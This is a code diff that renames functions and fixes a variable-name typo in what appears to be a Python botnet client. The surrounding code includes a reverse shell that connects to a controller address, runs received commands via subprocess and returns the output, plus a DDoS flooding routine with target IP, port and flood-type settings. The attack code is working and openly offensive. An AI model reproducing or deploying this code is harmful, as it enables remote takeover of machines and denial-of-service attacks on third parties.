@@ -26,7 +26,7 @@ else:
     os._exit(0)
 
 # functions
-def waitUntilThreadsClosed():
+def wait_for_threads():
     while open_threads > 0:
         time.sleep(0.1)
 
@@ -106,7 +106,7 @@ def ddos():
         s.close()
     open_threads -= 1
 
-def exitHandler(sig, frame):
+def exit_handler(sig, frame):
     global planet_online, planet_shutting_down
     planet_shutting_down = True
     if planet_online:
@@ -116,7 +116,7 @@ def exitHandler(sig, frame):
     planet_shelled = False
     planet_socket.close()
     print("Exiting...")
-    waitUntilThreadsClosed()
+    wait_for_threads()
     os._exit(0)
 
 def connect_to_galaxy():
@@ -134,15 +134,15 @@ def connect_to_galaxy():
 
 def shell():
     global planet_shelled
-    shell_socker = socket.socket()
-    shell_socker.connect((galaxy_ip, shell_port))
+    shell_socket = socket.socket()
+    shell_socket.connect((galaxy_ip, shell_port))
     cwd = os.getcwd()
-    shell_socker.send(cwd.encode())
+    shell_socket.send(cwd.encode())
     while not planet_shutting_down:
         shell_cmds = []
-        shell_cmd = shell_socker.recv(shell_buf_size).decode()
+        shell_cmd = shell_socket.recv(shell_buf_size).decode()
         if shell_cmd.lower() == "exit":
-            shell_socker.close()
+            shell_socket.close()
             planet_shelled = False
             break
         if "&&" in shell_cmd and not ";" in shell_cmd:
@@ -179,10 +179,10 @@ def shell():
                     output = f"{output}\n{subprocess.getoutput(shell_list_cmd.strip())}"
         cwd = os.getcwd()
         message = f"{output}<sep>{cwd}"
-        shell_socker.send(message.encode())
+        shell_socket.send(message.encode())
     if planet_shutting_down:
-        shell_socker.send("shutting down".encode())
-    shell_socker.close()
+        shell_socket.send("shutting down".encode())
+    shell_socket.close()
 
 def connection_handler():
     global planet_online, flood_type, target_ip, target_port, open_threads, planet_id, planet_shelled, planet_attacking, shell_buf_size
@@ -227,7 +227,7 @@ def connection_handler():
     open_threads -= 1
 
 # exit handler
-signal(SIGINT, exitHandler)
+signal(SIGINT, exit_handler)
 
 # variables
 galaxy_ip = "192.168.1.2"
